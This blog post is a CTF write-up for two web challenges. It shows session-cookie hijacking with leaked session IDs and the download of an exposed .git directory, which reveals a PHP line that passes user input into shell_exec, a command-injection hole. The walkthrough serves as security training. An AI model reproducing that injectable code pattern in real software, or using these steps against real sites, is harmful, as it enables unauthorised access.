---
layout: post
title:  "CyberTalents - Ainshams University CTF2019"
description: It was very easy Web Challenge.
tags: websec cybertalents rce
img: "/images/WebCTF/ainshams/banner.jpg"
---
I will solve the web Challenges in this post so there are two challenge select anyone you need and enjoy  

1. [Dark Session](#dark-session)
2. [Broken Doors](#broken-doors)  

# Dark Session

As the usual I will run dirb  but in i found nothing bad luck xD  

So let's see the the source code  

Yes i found brainFuck encryption  

![image](/images/WebCTF/ainshams/1.png)

So let's decode it [dcode.fr](https://www.dcode.fr/brainfuck-language)  

Awsomme we got something looks useful  
```javascript
if(document.cookie !== ''){        $.post('getuserinfo.php',{          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1](        },function(data){2          cu = data;<        });F      }
```
There are `getuserinfo.php` and it's takes POST data `PHPSESSID= ???`  

So let's see what's inside it  

![image](/images/WebCTF/ainshams/2.png)  

Ahaa it's API Hmmm  

So we need value for PHPSESSID to get the userinfo  

Let's back to `/Dark-Sessions/` and see again on it  

Damn I got this message   
```
Session not found in our secret place , {http://tiny.cc/u16dfz}
```

It's pastbin and there are Secret Sessions
```
#Secret_Sessions#
iuqwhe23eh23kej2hd2u3h2k23
11l3ztdo96ritoitf9fr092ru3
ksjdlaskjd23ljd2lkjdkasdlk
```
So let put it in Cookie and see what will happen  

```bash
GET /Dark-Sessions/ HTTP/1.1
Host: 54.93.122.202
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ar,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=11l3ztdo96ritoitf9fr092ru3
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
Shit I got anther message 
```
UserInfo Cookie don't have the username , you need to go deeper... 
```
I think i need to get the username and put it in Cookie too in UserInfo   

So let's try to send the session in the API and let's see what will happen  

![image](/images/WebCTF/ainshams/3.png)

Awsome i got the username it's so easy  

let's put it in the Cookie  

![image](/images/WebCTF/ainshams/4.png)

Woow it's so easy we got the flag
```
Secret_session_gained_succefully
```
# Broken doors

As the usual I will run dirb  

```Bash
root@kali:~/Desktop# dirb http://18.197.166.159/Broken-doors/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Nov 30 12:15:24 2019
URL_BASE: http://18.197.166.159/Broken-doors/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4614

---- Scanning URL: http://18.197.166.159/Broken-doors/ ----
+ http://18.197.166.159/Broken-doors/.git/HEAD (CODE:200|SIZE:23)
^C> Testing: http://18.197.166.159/Broken-doors/_tempalbums
```
Yes I got .git so lets download it

```Bash
root@kali:~/Desktop/cyber# rm .git
root@kali:~/Desktop/cyber# mkdir git
root@kali:~/Desktop/cyber# cd git
root@kali:~/Desktop/cyber/git# wget -r http://18.197.166.159/Broken-doors/.git/
--2019-11-30 10:56:36--  http://18.197.166.159/Broken-doors/.git/
Connecting to 18.197.166.159:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘18.197.166.159/Broken-doors/.git/index.html’

18.197.166.159/Brok     [ <=>                ]   1.39K  --.-KB/s    in 0s

2019-11-30 10:56:36 (71.8 MB/s) - ‘18.197.166.159/Broken-doors/.git/index.html’ saved [1420]

Loading robots.txt; please ignore errors.
--2019-11-30 10:56:36--  http://18.197.166.159/robots.txt
Reusing existing connection to 18.197.166.159:80.
HTTP request sent, awaiting response... 404 Not Found
2019-11-30 10:56:36 ERROR 404: Not Found.

--2019-11-30 10:56:36--  http://18.197.166.159/Broken-doors/
Reusing existing connection to 18.197.166.159:80.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘18.197.166.159/Broken-doors/index.html’

18.197.166.159/Brok     [ <=>                ]   2.47K  --.-KB/s    in 0s

2019-11-30 10:56:36 (5.19 MB/s) - ‘18.197.166.159/Broken-doors/index.html’ saved [2531]

--2019-11-30 10:56:36--  http://18.197.166.159/Broken-doors/.git/branches/
```
```Bash
root@kali:~/Desktop/cyber/git/18.197.166.159# cd Broken-doors/
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors# ls
index.html
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors# ls -la
total 16
drwxr-xr-x 3 root root 4096 Nov 30 10:56 .
drwxr-xr-x 3 root root 4096 Nov 30 10:56 ..
drwxr-xr-x 8 root root 4096 Nov 30 10:56 .git
-rw-r--r-- 1 root root 2531 Nov 30 10:56 index.html
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors# cd .git
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors/.git# ls -la
total 56
drwxr-xr-x  8 root root 4096 Nov 30 10:56 .
drwxr-xr-x  3 root root 4096 Nov 30 10:56 ..
drwxr-xr-x  2 root root 4096 Nov 30 10:56 branches
-rw-r--r--  1 root root   15 Nov 30 04:56 COMMIT_EDITMSG
-rw-r--r--  1 root root  210 Nov 30 04:55 config
-rw-r--r--  1 root root   73 Nov 30 04:54 description
-rw-r--r--  1 root root   23 Nov 30 04:54 HEAD
drwxr-xr-x  2 root root 4096 Nov 30 10:56 hooks
-rw-r--r--  1 root root  413 Nov 30 04:56 index
-rw-r--r--  1 root root 1420 Nov 30 10:56 index.html
drwxr-xr-x  2 root root 4096 Nov 30 10:56 info
drwxr-xr-x  3 root root 4096 Nov 30 10:56 logs
drwxr-xr-x 12 root root 4096 Nov 30 10:56 objects
drwxr-xr-x  5 root root 4096 Nov 30 10:56 refs
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors/.git# git reflog
29ebf0c (HEAD -> master, origin/master) HEAD@{0}: commit (initial): initial commit
```
Awesome so let's see what inside `29ebf0c`  

```Bash
root@kali:~/Desktop/cyber/git/18.197.166.159/Broken-doors/.git# git show 29ebf0c
commit 29ebf0c83d1793add4635c43b011b5ee4d4c90a7 (HEAD -> master, origin/master)
Author: root <root@ip-172-31-21-79.eu-central-1.compute.internal>
Date:   Sat Nov 30 09:56:16 2019 +0000

    initial commit

diff --git a/.gitignore b/.gitignore
new file mode 100644
index 0000000..acf36e4
--- /dev/null
+++ b/.gitignore
@@ -0,0 +1 @@
+flag
diff --git a/.htaccess b/.htaccess
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/.htaccess
@@ -0,0 +1 @@
+
diff --git a/DoOr1337xoe/.htaccess b/DoOr1337xoe/.htaccess
new file mode 100644
index 0000000..0a9a047
--- /dev/null
+++ b/DoOr1337xoe/.htaccess
```

And i got the index.php file

```Bash
+                <br />^M
+                <b>MD5 Hash: </b>^M
+                <?php^M
+                 echo shell_exec('echo '.$_GET['string'].'| md5sum "-"');^M
+                 ?>^M
+                <br /><br />^M
+            </p>^M
```
So now we have two ways the first one is so easy and the second one is easy  
1. I will visit ```
DoOr1337xoe/flag
```.  

2. I will get RCE from bypass this line 
```
echo shell_exec('echo '.$_GET['string'].'| md5sum "-"');
```.   

So if you lazy like me you i will visit ```url
http://18.197.166.159/Broken-doors/DoOr1337xoe/flag
```  

and you will get the flag `flag{Br0k3n_D00r5_4r3_n0t_s4f3}`  

---

I hope u enjoyed with this writeup. You can follow me on the twitter [@Mrx_Exploit](https://twitter.com/MRX_Exploit)
